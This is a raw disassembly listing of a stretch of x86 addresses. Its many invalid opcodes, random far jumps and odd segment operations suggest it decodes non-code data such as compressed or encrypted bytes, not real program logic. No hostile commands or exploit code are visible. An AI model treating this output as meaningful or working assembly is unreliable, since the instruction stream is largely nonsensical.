  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	xor    DWORD PTR [ebp+0x74],0x25
  4149e6:	fiadd  WORD PTR [bx+si]
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    bh,ch
  4149ef:	or     BYTE PTR [esi+0x5d38010a],bl
  4149f5:	and    DWORD PTR [ebx+0x3fc34519],0xffffff97
  4149fc:	ror    DWORD PTR [ebx-0x13450a03],1
  414a02:	(bad)  
  414a03:	and    al,0xba
  414a05:	sub    BYTE PTR [ebx],0x38
  414a08:	push   0x3110dfb5
  414a0d:	retf   0xa5c0
  414a10:	xchg   ebx,eax
  414a11:	mov    ds:0x7e8c880,al
  414a16:	adc    al,0x62
  414a18:	arpl   WORD PTR [edi],dx
  414a1a:	repnz and eax,0x462fc02f
  414a20:	xchg   esp,eax
  414a21:	adc    al,0xfd
  414a23:	push   eax
  414a24:	loop   0x4149fc
  414a26:	add    al,0xef
  414a28:	add    DWORD PTR [eax+0x18],esi
  414a2b:	cmp    al,0x5a
  414a2d:	fidivr WORD PTR [edx+0x6baa72a6]
  414a33:	jmp    0xddfc:0x5be2f843
  414a3a:	mov    ?,esp
  414a3c:	push   ecx
  414a3d:	xchg   ecx,eax
  414a3e:	or     ch,cl
  414a40:	nop
  414a41:	dec    ebp
  414a42:	dec    esi
  414a43:	ins    DWORD PTR es:[edi],dx
  414a44:	jp     0x4149e0
  414a46:	cmp    al,0x71
  414a48:	dec    ebp
  414a49:	test   eax,0x94cecc0
  414a4e:	sbb    dl,BYTE PTR [ecx+0x1e]
  414a51:	fld    QWORD PTR [edi]
  414a53:	(bad)  
  414a54:	xchg   esi,eax
  414a55:	inc    edx
  414a56:	bound  esi,QWORD PTR [ecx+0x58]
  414a59:	cmp    ebx,DWORD PTR [ebp+0x751418a4]
  414a5f:	mov    cl,0xb6
  414a61:	scas   al,BYTE PTR es:[edi]
  414a62:	inc    ebp
  414a63:	ret    
  414a64:	and    DWORD PTR [eax-0x52dd0ab],edi
  414a6a:	fistp  QWORD PTR [eax-0x720c8d83]
  414a70:	add    esi,ebx
  414a72:	mov    BYTE PTR [ebx],bl
  414a74:	mov    al,0x83
  414a76:	gs xchg ebx,eax
  414a78:	(bad)  
  414a79:	std    
  414a7a:	cmp    BYTE PTR [edx],0x8b
  414a7d:	push   ecx
  414a7e:	jae    0x5c326bbd
  414a84:	mov    edi,0xdc0aca50
  414a89:	jl     0x414ace
  414a8b:	ins    BYTE PTR es:[edi],dx
  414a8c:	sbb    BYTE PTR [edi],al
  414a8e:	inc    ebp
  414a8f:	inc    esi
  414a90:	sub    bl,BYTE PTR [ecx+0x7622b115]
  414a96:	mov    ss,WORD PTR [eax-0x1a]
  414a99:	aad    0xb0
  414a9b:	(bad)  
  414a9c:	sub    eax,0x38e6bc5f
  414aa1:	mov    cl,0xd0
  414aa3:	xchg   ebp,eax
  414aa4:	gs mov esi,0x9b4f9cc
  414aaa:	push   cs
  414aab:	sbb    edi,edx
  414aad:	arpl   WORD PTR [ecx],bx
  414aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ab0:	add    esi,DWORD PTR [edx]
  414ab2:	nop
  414ab3:	sbb    dh,bl
  414ab5:	enter  0xd267,0x77
  414ab9:	xor    cl,BYTE PTR [ebp-0xf6777eb]
  414abf:	xchg   ebx,eax
  414ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ac1:	sub    BYTE PTR es:[ecx-0x1f],bh
  414ac5:	lock inc eax
  414ac7:	sub    BYTE PTR [esi-0x7c1f26c],dl
  414acd:	outs   dx,BYTE PTR ds:[esi]
  414ace:	out    dx,al
  414acf:	or     eax,0x718412cc
  414ad4:	push   ecx
  414ad5:	push   edi
  414ad6:	fs pop esp
  414ad8:	inc    esp
  414ad9:	mov    cl,0xd8
  414adb:	push   esp
  414adc:	(bad)  [edx]
  414ade:	pop    edi
  414adf:	jo     0x414add
  414ae1:	sbb    BYTE PTR [ebx-0x5e],cl
  414ae4:	cld    
  414ae5:	jb     0x414a91
  414ae7:	mov    DWORD PTR [esi],ebp
  414ae9:	mov    BYTE PTR ss:[edi-0x35],0xfb
	...
  414b56:	lahf   
  414b57:	fnstcw WORD PTR [esi]
  414b59:	ss jle 0x414b53
  414b5c:	lahf   
  414b5d:	stc    
  414b5e:	bound  esp,QWORD PTR [ebx+0x40c263d9]
  414b64:	adc    cl,BYTE PTR [edi+0x67]
  414b67:	fild   WORD PTR [eax]
  414b69:	add    BYTE PTR [eax],al
  414b6b:	add    DWORD PTR [eax],eax
  414b6d:	add    dl,bh
  414b6f:	dec    esi
  414b70:	and    al,0xb9
  414b72:	hlt    
  414b73:	xchg   cl,ah
  414b75:	inc    ebx
  414b76:	push   edi
  414b77:	in     eax,0xae
  414b79:	jae    0x414baf
  414b7b:	mov    ds:0x3892a063,al
  414b80:	cs out 0x6,al
  414b83:	in     eax,dx
  414b84:	jmp    0xdf03:0x19ce719f
  414b8b:	add    eax,0xffffffd1
  414b8e:	jp     0x414bf0
  414b90:	xchg   edi,eax
  414b91:	mov    ebp,0x9137389
  414b96:	sub    DWORD PTR [eax-0x69a03a0a],esp
  414b9c:	cmp    ecx,DWORD PTR [eax-0x45]
  414b9f:	adc    DWORD PTR [edx+0x6d],esi
  414ba2:	inc    BYTE PTR [ebp+0x188e48ea]
  414ba8:	mov    DWORD PTR [esi-0x2ee1e3ac],eax
  414bae:	cmp    ch,cl
  414bb0:	xor    al,0x90
  414bb2:	les    esi,FWORD PTR [edi]
  414bb4:	mov    bl,0x39
  414bb6:	mov    bh,0x34
  414bb8:	(bad)  
  414bba:	dec    ebx
  414bbb:	loop   0x414b53
  414bbd:	imul   edx,edx,0x65
  414bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bc1:	(bad)  
  414bc3:	pop    edx
  414bc4:	adc    edi,DWORD PTR [eax+0x13]
  414bc7:	stos   BYTE PTR es:[edi],al
  414bc8:	pop    es
  414bc9:	adc    BYTE PTR [ecx],dh
  414bcb:	and    DWORD PTR [ebp-0x1c7eaba6],0xce624dfd
  414bd5:	mov    al,ds:0x6a944da5
  414bda:	in     eax,0xf7
  414bdc:	push   eax
  414bdd:	jb     0x414b9d
  414bdf:	ror    DWORD PTR ds:0x121f78aa,1
  414be5:	xchg   esi,eax
  414be6:	mov    BYTE PTR [ebp-0x78],ch
  414be9:	popa   
  414bea:	add    BYTE PTR [ecx],dl
  414bec:	sub    eax,0x58b41e2a
  414bf1:	call   0x566:0xf7d19ef2
  414bf8:	and    DWORD PTR [ecx-0x5b6a5a11],0x6d945f48
  414c02:	push   esp
  414c03:	cmp    al,0xc1
  414c05:	sbb    eax,edi
  414c07:	aaa    
  414c08:	cs or  ecx,esi
  414c0b:	pop    esi
  414c0c:	div    DWORD PTR ds:0x71d7733d
  414c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c13:	rcl    DWORD PTR [edi+0x13],cl
  414c16:	jmp    0xfb07:0xa7ae3a1d
  414c1d:	je     0x414c9c
  414c1f:	outs   dx,DWORD PTR ds:[esi]
  414c20:	or     al,0x7e
  414c22:	jo     0x414c68
  414c24:	rol    DWORD PTR [ecx+0x4e623c62],1
  414c2a:	stos   DWORD PTR es:[edi],eax
  414c2b:	mov    eax,0xa5d4f060
  414c30:	push   es
  414c31:	aam    0xb0
  414c33:	rcl    esi,0x2a
  414c36:	mov    edx,0xd70a1020
  414c3b:	dec    edx
  414c3c:	jnp    0x414cae
  414c3e:	into   
  414c3f:	test   eax,0xcba125de
  414c44:	mov    esp,0xf706fa1a
  414c49:	in     eax,dx
  414c4a:	or     ch,BYTE PTR [ecx+0x67]
  414c4d:	mov    bh,0x4a
  414c4f:	jne    0x414bea
  414c51:	stc    
  414c52:	jmp    0x3ae9:0x258b928
  414c59:	adc    BYTE PTR [edi-0x5c990194],cl
  414c5f:	cmp    BYTE PTR [ebx-0xeb374f6],ch
  414c65:	(bad)  
  414c66:	in     eax,0xa7
  414c68:	es inc esi
  414c6a:	popf   
  414c6b:	je     0x414c92
  414c6d:	cmp    eax,DWORD PTR [eax]
	...
  414cd3:	add    BYTE PTR [eax],al
  414cd5:	add    BYTE PTR [esp+eiz*2],dh
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	adc    ebp,DWORD PTR cs:[eax+0x6754a622]
  414ce7:	loopne 0x414ce9
  414ce9:	add    BYTE PTR [eax],al
  414ceb:	add    DWORD PTR [eax],eax
  414ced:	add    cl,ch
  414cef:	and    al,cl
  414cf1:	gs icebp 
  414cf3:	sub    al,0x57
  414cf5:	xchg   BYTE PTR [ebp+0x46],dl
  414cf8:	adc    BYTE PTR [edi],ah
  414cfa:	push   ecx
  414cfb:	inc    edx
  414cfc:	cmp    eax,0x586664a8
  414d01:	sbb    eax,0x3022b145
  414d06:	les    ebp,FWORD PTR [edx]
  414d08:	add    edx,DWORD PTR [ecx+0x32]
  414d0b:	xchg   ecx,eax
  414d0c:	es fcomip st,st(2)
  414d0f:	icebp  
  414d10:	pop    eax
  414d11:	test   eax,0x113980ce
  414d16:	pop    eax
  414d17:	cdq    
  414d18:	into   
  414d19:	sar    BYTE PTR [ecx+edi*8-0x13837766],cl
  414d20:	sbb    eax,0xba617ab4
  414d25:	mov    ecx,0x836b679c
  414d2a:	push   cs
  414d2b:	cmc    
  414d2c:	pop    ds
  414d2d:	mov    eax,0xbbb56a01
  414d32:	mov    ah,0x8c
  414d34:	cmp    BYTE PTR [ebx],ah
  414d36:	data16 daa 
  414d38:	pop    edx
  414d39:	xchg   esp,eax
  414d3a:	lahf   
  414d3b:	inc    eax
  414d3c:	sbb    BYTE PTR [ecx],ch
  414d3e:	shr    al,cl
  414d40:	add    ch,BYTE PTR [ebp+0x42]
  414d43:	push   edx
  414d44:	cdq    
  414d45:	pop    ebp
  414d46:	jne    0x414ce3
  414d48:	add    DWORD PTR [ebp+0x7aee2aa3],0x7175ac70
  414d52:	or     esi,edi
  414d54:	dec    esi
  414d55:	mov    dl,BYTE PTR [esp+ecx*2-0x4a]
  414d59:	pop    ss
  414d5a:	(bad)  
  414d5c:	xchg   DWORD PTR [ebx-0x7e475afe],esp
  414d62:	adc    al,0xe7
  414d64:	push   ebp
  414d65:	inc    ebp
  414d66:	(bad)  
  414d67:	mov    ?,WORD PTR [ecx]
  414d69:	or     ch,dh
  414d6b:	sbb    bl,BYTE PTR [esi+0x44e8bfc7]
  414d71:	in     eax,0x2a
  414d73:	jmp    0xd771:0x7e53e6b2
  414d7a:	pop    ebp
  414d7b:	data16 (bad) 
  414d7d:	(bad)  
  414d7e:	inc    esp
  414d7f:	fcom   DWORD PTR [ebx]
  414d81:	xlat   BYTE PTR ds:[ebx]
  414d82:	and    BYTE PTR [ebp-0x7d85a5c5],ch
  414d88:	retf   0x65ab
  414d8b:	div    esi
  414d8d:	jle    0x414df4
  414d8f:	cmp    DWORD PTR [edi+0x29],edx
  414d92:	push   cs
  414d93:	(bad)  
  414d95:	push   0xffffff92
  414d97:	shl    BYTE PTR [ebp+0x7780313],1
  414d9d:	pop    esp
  414d9e:	xchg   edx,eax
  414d9f:	retf   0x24f0
  414da2:	or     eax,0x8a34a5f
  414da7:	bound  esp,QWORD PTR [ebp-0x67]
  414daa:	test   al,0xbd
  414dac:	adc    DWORD PTR ds:[edx-0x1e],edi
  414db0:	in     eax,dx
  414db1:	adc    edi,DWORD PTR [ebx-0x22c65ddc]
  414db7:	cmp    esi,DWORD PTR [ebx]
  414db9:	ins    DWORD PTR es:[edi],dx
  414dba:	fnsave [ebp+0x6100f57c]
  414dc0:	scas   al,BYTE PTR es:[edi]
  414dc1:	ret    0x7f1f
  414dc4:	and    esi,DWORD PTR [eax+0x74]
  414dc7:	ret    0xf7c4
  414dca:	imul   ebx,DWORD PTR [eax],0x6f
  414dcd:	and    al,0xd3
  414dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dd0:	je     0x414e3b
  414dd2:	adc    esp,DWORD PTR [edx-0x57]
  414dd5:	mov    ebx,0xf9709ccd
  414dda:	add    BYTE PTR [ebx+eiz*1-0x67e91eb3],ch
  414de1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414de2:	lahf   
  414de3:	add    eax,0xff4a947b
  414de8:	(bad)  
  414de9:	push   edx
  414dea:	outs   dx,BYTE PTR ds:[esi]
  414deb:	dec    ecx
  414dec:	pop    ds
  414ded:	sbb    eax,0x0
	...
  414e56:	mov    bh,0x99
  414e58:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x6e1fc16a
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    BYTE PTR [ebx],cl
  414e6f:	cmp    al,0xd8
  414e71:	push   ebp
  414e72:	sbb    DWORD PTR [edi+0x7e790770],esi
  414e78:	rol    BYTE PTR [esi],1
  414e7a:	lds    edi,FWORD PTR [ecx-0x7a]
  414e7d:	push   edi
  414e7e:	cmp    ecx,DWORD PTR [esi]
  414e80:	jg     0x414ee0
  414e82:	xchg   DWORD PTR [eax-0x321cbbb6],ecx
  414e88:	ss sbb ebp,esp
  414e8b:	jne    0x414e79
  414e8d:	xchg   esi,eax
  414e8e:	mov    edi,0x7bb2caad
  414e93:	inc    edi
  414e94:	mov    esp,0xb3d4d159
  414e99:	pop    es
  414e9a:	mov    bh,0x97
  414e9c:	mov    eax,0x63c33d4f
  414ea1:	std    
  414ea2:	jmp    0x53dda3a1
  414ea7:	(bad)  
  414ea8:	adc    DWORD PTR [eax+0x58],esi
  414eab:	pop    ds
  414eac:	in     eax,dx
  414ead:	inc    eax
  414eae:	jo     0x414e48
  414eb0:	das    
  414eb1:	(bad)  
  414eb2:	sti    
  414eb3:	pop    ss
  414eb4:	mov    esp,0x8a21f10
  414eb9:	xchg   esp,eax
  414eba:	(bad)  
  414ebb:	fsubr  st(6),st
  414ebd:	xchg   esp,eax
  414ebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ec0:	std    
  414ec1:	popf   
  414ec2:	lods   eax,DWORD PTR ds:[esi]
  414ec3:	pop    esp
  414ec4:	icebp  
  414ec5:	pop    ecx
  414ec6:	pop    esi
  414ec7:	mov    bh,0xb9
  414ec9:	mov    dl,0x2d
  414ecb:	dec    edx
  414ecc:	cmp    DWORD PTR [edx],ebp
  414ece:	cmovae esi,DWORD PTR [ebx+ebp*1]
  414ed2:	fldcw  WORD PTR [esi]
  414ed4:	jns    0x414f47
  414ed6:	dec    edi
  414ed7:	or     al,0x11
  414ed9:	adc    eax,0x1b8c7917
  414ede:	mov    esi,0x2f74ddb8
  414ee3:	imul   ecx,DWORD PTR [di],0x6411a40a
  414eea:	or     BYTE PTR [ebx+ebp*2-0x7496c279],ah
  414ef1:	outs   dx,DWORD PTR ds:[esi]
  414ef2:	jmp    0x36e0:0xd228f40
  414ef9:	xchg   ebx,eax
  414efa:	hlt    
  414efb:	pusha  
  414efc:	fistp  QWORD PTR [eax+0x713b925d]
  414f02:	das    
  414f03:	out    0x7c,eax
  414f05:	push   ebx
  414f06:	js     0x414f02
  414f08:	mov    al,ds:0xc6472947
  414f0d:	sub    ebx,DWORD PTR [edi+0x65672486]
  414f13:	mov    eax,ds:0x144a860
  414f18:	adc    DWORD PTR [eax-0x68],esp
  414f1b:	fild   DWORD PTR [ebx]
  414f1d:	or     dh,0x89
  414f20:	std    
  414f21:	stos   DWORD PTR es:[edi],eax
  414f22:	jmp    DWORD PTR es:[eax-0x394dec1]
  414f29:	mov    ds:0xf8bab1f5,al
  414f2e:	xor    eax,0xd78f4259
  414f33:	pop    eax
  414f34:	stos   BYTE PTR es:[edi],al
  414f35:	retf   0x597e
  414f38:	mov    esi,0x6c00cd4c
  414f3d:	retf   0x2830
  414f40:	pop    esi
  414f41:	add    ebx,DWORD PTR [edi-0x2ee1e333]
  414f47:	mov    ds:0xb42509a,al
  414f4c:	cmp    BYTE PTR [esi+0x4429bde1],cl
  414f52:	sbb    ch,BYTE PTR [ebx]
  414f54:	arpl   WORD PTR ds:0x8145b95f,si
  414f5a:	or     bl,BYTE PTR [ecx-0x15f0691b]
  414f60:	ds addr16 push ebx
  414f63:	retf   0x1dd4
  414f66:	mov    ch,0xba
  414f68:	out    0x85,eax
  414f6a:	pop    ecx
  414f6b:	fucomi st,st(7)
  414f6d:	add    DWORD PTR [eax],0x0
	...
  414fd3:	add    BYTE PTR [eax],al
  414fd5:	add    BYTE PTR [edi],dh
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0x2fd62edf
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	pop    ds
  414fef:	dec    eax
  414ff0:	jnp    0x415010
  414ff2:	rcl    BYTE PTR [ebx-0x5e306bbd],cl
  414ff8:	cdq    
  414ff9:	jp     0x41504d
  414ffb:	call   0x56f7:0x7440c138
  415002:	cwde   
  415003:	ja     0x41504c
  415005:	dec    edx
  415006:	retf   0xe96b
  415009:	xlat   BYTE PTR ds:[ebx]
  41500a:	push   ebx
  41500b:	dec    edx
  41500c:	clc    
  41500d:	jp     0x415076
  41500f:	dec    esp
  415010:	inc    edx
  415011:	jmp    0xdfd9:0x34e51d9e
  415018:	mov    al,ds:0x89ef5ca5
  41501d:	cmp    eax,DWORD PTR [edx]
  41501f:	dec    ecx
  415020:	lds    ebp,FWORD PTR [di+0x74]
  415024:	loopne 0x41507b
  415026:	mov    ebp,cr2
  415029:	loope  0x414fc2
  41502b:	and    BYTE PTR [edi+0x64bdc691],al
  415031:	inc    esi
  415032:	shl    al,1
  415034:	cmp    BYTE PTR [ebx-0x5b08fe0e],bh
  41503a:	jmp    0x414fd3
  41503c:	adc    al,0xbe
  41503e:	xchg   dh,bl
  415040:	jge    0x414fcd
  415042:	ror    BYTE PTR [edx-0x679b8b98],0x26
  415049:	cld    
  41504a:	and    esi,DWORD PTR [edi+0x7d9f6cec]
  415050:	dec    ecx
  415051:	stc    
  415052:	sub    al,0xe5
  415054:	(bad)  
  415055:	xchg   ebx,eax
  415056:	and    BYTE PTR [esi+edi*8-0x27836f76],dh
  41505d:	int    0xe3
  41505f:	lock aad 0x58
  415062:	sub    DWORD PTR [edi-0x64],ecx
  415065:	enter  0x8c3f,0xae
  415069:	mov    BYTE PTR [ebp-0x78bbc4e5],bl
  41506f:	out    dx,eax
  415070:	test   DWORD PTR [edi+0x36f21f16],ecx
  415076:	nop
  415077:	pushf  
  415078:	(bad)  
  415079:	mov    ch,0x39
  41507b:	add    edi,DWORD PTR [esi]
  41507d:	(bad)  
  41507e:	retf   
  41507f:	xchg   ebx,eax
  415080:	rol    BYTE PTR [esi+0x3e],cl
  415083:	jne    0x4150bf
  415085:	icebp  
  415086:	loope  0x4150f4
  415088:	inc    edi
  41508a:	mov    dh,0xb5
  41508c:	add    eax,0x91b9b0d5
  415091:	pop    edx
  415092:	add    eax,0x7f6e0eef
  415097:	jb     0x415100
  415099:	(bad)  
  41509a:	adc    ecx,ecx
  41509c:	sbb    BYTE PTR [ecx+0x2682e3ea],dh
  4150a2:	jbe    0x415025
  4150a4:	pop    eax
  4150a5:	into   
  4150a6:	std    
  4150a7:	adc    eax,0x82c4fead
  4150ac:	lds    eax,FWORD PTR [ebp-0x1e30ed05]
  4150b2:	dec    esp
  4150b3:	or     DWORD PTR [esi+0x2e],eax
  4150b6:	scas   eax,DWORD PTR es:[edi]
  4150b7:	sbb    DWORD PTR es:[ecx-0x5],edx
  4150bb:	xchg   ebp,esp
  4150bd:	inc    ecx
  4150be:	xchg   esi,eax
  4150bf:	ret    
  4150c0:	and    cl,dl
  4150c2:	stos   BYTE PTR es:[edi],al
  4150c3:	retf   
  4150c4:	dec    edi
  4150c5:	mov    ds:0xbfa3bbee,eax
  4150ca:	sub    BYTE PTR fs:[edx+0x7ca94808],dl
  4150d1:	ret    
  4150d2:	xor    esi,eax
  4150d4:	cmp    DWORD PTR [edx+0x46],esp
  4150d7:	cli    
  4150d8:	lods   eax,DWORD PTR ds:[esi]
  4150d9:	inc    ebp
  4150da:	ins    DWORD PTR es:[edi],dx
  4150db:	mov    eax,ds:0x4a18e5c1
  4150e0:	retf   0x1ed3
  4150e3:	mov    edi,DWORD PTR [ebp-0x53]
  4150e6:	xor    DWORD PTR [esi-0x15],0x3e817cf4
  4150ed:	or     eax,DWORD PTR [eax]
	...
  415153:	add    BYTE PTR [eax],al
  415155:	add    BYTE PTR [ebx+0x2],bh
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0x3bf9fc2d
  415164:	sti    
  415165:	adc    esp,DWORD PTR [edi-0x1d]
  415168:	add    BYTE PTR [eax],al
  41516a:	add    BYTE PTR [ecx],al
  41516c:	add    BYTE PTR [eax],al
  41516e:	and    esi,DWORD PTR [ebx-0x3b]
  415171:	mov    edx,0x5ded1fee
  415176:	repz jp 0x4151ca
  415179:	mov    ?,ebp
  41517b:	stc    
  41517c:	adc    eax,0x5e35817b
  415181:	shl    BYTE PTR [ebp+0x5d24eb95],1
  415187:	xor    bh,BYTE PTR ds:0x81ee5863
  41518d:	jbe    0x41516a
  41518f:	and    al,0x61
  415191:	test   al,0x44
  415193:	out    dx,eax
  415194:	sbb    ebp,esp
  415196:	ret    
  415197:	xor    ch,BYTE PTR [edi+0x3a4468f8]
  41519d:	jecxz  0x415145
  41519f:	dec    eax
  4151a0:	dec    ebp
  4151a1:	inc    ebp
  4151a2:	fstp   DWORD PTR [ebp-0x46]
  4151a5:	adc    BYTE PTR [ebp-0x629703fb],0x50
  4151ac:	inc    edi
  4151ad:	test   DWORD PTR ds:0x8fd1cdba,0x866b0f0b
  4151b7:	dec    edi
  4151b8:	adc    ebx,DWORD PTR [esi+edi*8+0x7600f804]
  4151bf:	in     eax,dx
  4151c0:	jbe    0x41516a
  4151c2:	sar    BYTE PTR [ebp+0x1],0x70
  4151c6:	shr    BYTE PTR [ebx-0x48fea4f6],1
  4151cc:	fadd   st(0),st
  4151ce:	loope  0x415218
  4151d0:	add    eax,0xa4126b4a
  4151d5:	test   DWORD PTR [ebp-0x67],ebp
  4151d8:	inc    edi
  4151d9:	scas   al,BYTE PTR es:[edi]
  4151da:	inc    edx
  4151db:	(bad)  
  4151dd:	dec    edi
  4151de:	dec    eax
  4151df:	inc    ecx
  4151e0:	adc    ecx,DWORD PTR [eax+ebx*1-0x20]
  4151e4:	(bad)  
  4151e5:	loopne 0x415181
  4151e7:	add    ebp,eax
  4151e9:	push   edx
  4151ea:	dec    ebp
  4151eb:	aam    0x21
  4151ed:	cmp    eax,0xc4ad4c2d
  4151f2:	dec    ecx
  4151f3:	or     eax,0xab3472a2
  4151f8:	pusha  
  4151f9:	lods   eax,DWORD PTR ds:[esi]
  4151fa:	inc    esp
  4151fb:	arpl   si,ax
  4151fd:	hlt    
  4151fe:	std    
  4151ff:	xchg   BYTE PTR [ebp+0x32],bl
  415202:	cmp    eax,ecx
  415204:	cmp    al,0xa1
  415206:	and    BYTE PTR [bx+di],cl
  415209:	ins    BYTE PTR es:[edi],dx
  41520a:	mov    edi,0xcff524fc
  41520f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415210:	sub    al,0xc2
  415212:	sub    bl,BYTE PTR [ebp+0x215d41de]
  415218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415219:	or     al,0x49
  41521b:	inc    edi
  41521c:	sahf   
  41521d:	sub    esp,eax
  41521f:	das    
  415220:	(bad)  
  415221:	retf   0x1ff5
  415224:	push   esi
  415225:	mov    eax,0x1184ccba
  41522a:	inc    BYTE PTR [ebx-0x46]
  41522d:	gs pop edx
  41522f:	cdq    
  415230:	push   ds
  415231:	fwait
  415232:	sbb    al,0x77
  415234:	retf   0x89e3
  415237:	clc    
  415238:	or     ebp,DWORD PTR [eax+0x18]
  41523b:	cmp    eax,0x692e8d59
  415240:	(bad)  
  415241:	outs   dx,BYTE PTR ds:[esi]
  415242:	fisttp DWORD PTR [esi-0x5b]
  415245:	dec    DWORD PTR [edx-0x1e]
  415248:	mov    ds:0xd1a8ae70,al
  41524d:	repz fldenv [esi-0x482b8ae]
  415254:	(bad)  
  415256:	retf   0xaa3c
  415259:	add    al,0x82
  41525b:	and    DWORD PTR [eax+0x1e],edx
  41525e:	lods   al,BYTE PTR ds:[esi]
  41525f:	jb     0x4152a6
  415261:	pop    eax
  415262:	mov    WORD PTR [eax-0x68],es
  415265:	enter  0xc40e,0x68
  415269:	(bad)  
  41526a:	mov    ebp,DWORD PTR [edx]
  41526c:	iret   
  41526d:	or     eax,DWORD PTR [eax]
	...
  4152d3:	add    BYTE PTR [eax],al
  4152d5:	add    BYTE PTR [edi+edx*4],ch
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0x93b2360b
  4152e5:	shl    BYTE PTR [edi-0x1c],cl
  4152e8:	add    BYTE PTR [eax],al
  4152ea:	add    BYTE PTR [ecx],al
  4152ec:	add    BYTE PTR [eax],al
  4152ee:	sbb    al,0x4d
  4152f0:	and    bl,ah
  4152f2:	scas   eax,DWORD PTR es:[edi]
  4152f3:	pop    ss
  4152f4:	add    ebx,esp
  4152f6:	push   edi
  4152f7:	xchg   edi,eax
  4152f8:	cmovs  edx,DWORD PTR [ebx+0x3b]
  4152fc:	leave  
  4152fd:	mov    al,gs:0x4eadee24
  415303:	loopne 0x4152d4
  415305:	pop    ecx
  415306:	mov    ebx,0x6c4c502c
  41530b:	clc    
  41530c:	mov    ebp,0x8cf14227
  415311:	rcr    DWORD PTR [esi],1
  415313:	pop    ds
  415314:	call   0xd5bf:0x335d7bbf
  41531b:	fisttp QWORD PTR [ebp-0x66]
  41531e:	scas   eax,DWORD PTR es:[edi]
  41531f:	fcom   st(2)
  415321:	pop    ebp
  415322:	dec    esp
  415323:	sbb    edx,DWORD PTR [ebx+0x6b1e2712]
  415329:	xchg   edx,eax
  41532a:	dec    ebp
  41532b:	adc    al,BYTE PTR [ecx]
  41532d:	jge    0x415325
  41532f:	and    ebp,DWORD PTR [ebx+0x13]
  415332:	and    edi,ebx
  415334:	js     0x415304
  415336:	push   ecx
  415337:	je     0x4152e8
  415339:	xor    ah,BYTE PTR [ebp-0x1a7b0430]
  41533f:	stc    
  415340:	aas    
  415341:	inc    edx
  415342:	xchg   DWORD PTR [eax],ecx
  415344:	xor    eax,0x72c354c
  415349:	loopne 0x415388
  41534b:	cmp    ebp,DWORD PTR [esi+0x7b]
  41534e:	into   
  41534f:	(bad)  
  415351:	cld    
  415352:	dec    ebx
  415353:	xor    DWORD PTR [edx],esp
  415355:	push   es
  415356:	xchg   ebp,eax
  415357:	test   eax,0x94d9498e
  41535c:	mov    esi,0x37379b91
  415361:	ss mov cl,0x39
  415364:	iret   
  415365:	jg     0x4152f7
  415367:	add    BYTE PTR [eax-0x5],dh
  41536a:	in     al,0x9b
  41536c:	(bad)  
  41536d:	int3   
  41536e:	in     al,0xbc
  415370:	retf   0x2838
  415373:	jbe    0x415394
  415375:	push   ss
  415376:	push   cs
  415377:	ficomp DWORD PTR [eax+eax*4+0x11]
  41537b:	xchg   BYTE PTR [esi],bh
  41537d:	(bad)  
  41537f:	data16 mov cl,0x54
  415382:	test   al,0x6e
  415384:	out    dx,eax
  415385:	sub    bl,dl
  415387:	lds    edi,FWORD PTR [esi-0x66]
  41538a:	fwait
  41538b:	js     0x415347
  41538d:	mov    ch,0xac
  41538f:	push   cs
  415390:	jno    0x4153d3
  415392:	ins    BYTE PTR es:[edi],dx
  415393:	and    edi,DWORD PTR [eax-0x262d504d]
  415399:	jne    0x4153c4
  41539b:	retf   
  41539c:	les    ebx,FWORD PTR [eax-0x1f]
  41539f:	out    0xdf,eax
  4153a1:	std    
  4153a2:	sub    eax,esp
  4153a4:	addr16 inc esi
  4153a6:	and    DWORD PTR [ebx-0x1bd555ba],ebx
  4153ac:	sub    ebp,esi
  4153ae:	repnz popf 
  4153b0:	xor    al,0xef
  4153b2:	adc    eax,0x4447494b
  4153b7:	fst    st(1)
  4153b9:	xchg   edx,eax
  4153ba:	add    BYTE PTR [edx-0x3bf16fe8],0x22
  4153c1:	jmp    0x845c:0xf183d2f8
  4153c8:	dec    eax
  4153c9:	es dec eax
  4153cb:	test   DWORD PTR [edx-0x5d07608a],0x9c9db31
  4153d5:	cmp    al,0x52
  4153d7:	dec    edx
  4153d8:	repz in al,dx
  4153da:	fbld   TBYTE PTR [edi+0x7cea9107]
  4153e0:	outs   dx,DWORD PTR ds:[esi]
  4153e1:	dec    esp
  4153e2:	sbb    DWORD PTR [edx+0x23],ecx
  4153e5:	scas   al,BYTE PTR es:[edi]
  4153e6:	js     0x415451
  4153e8:	fwait
  4153e9:	pop    esp
  4153ea:	bnd ret 0x778e
	...
  415456:	ins    DWORD PTR es:[edi],dx
  415457:	lock repz jmp FWORD PTR cs:[edi]
  41545c:	std    
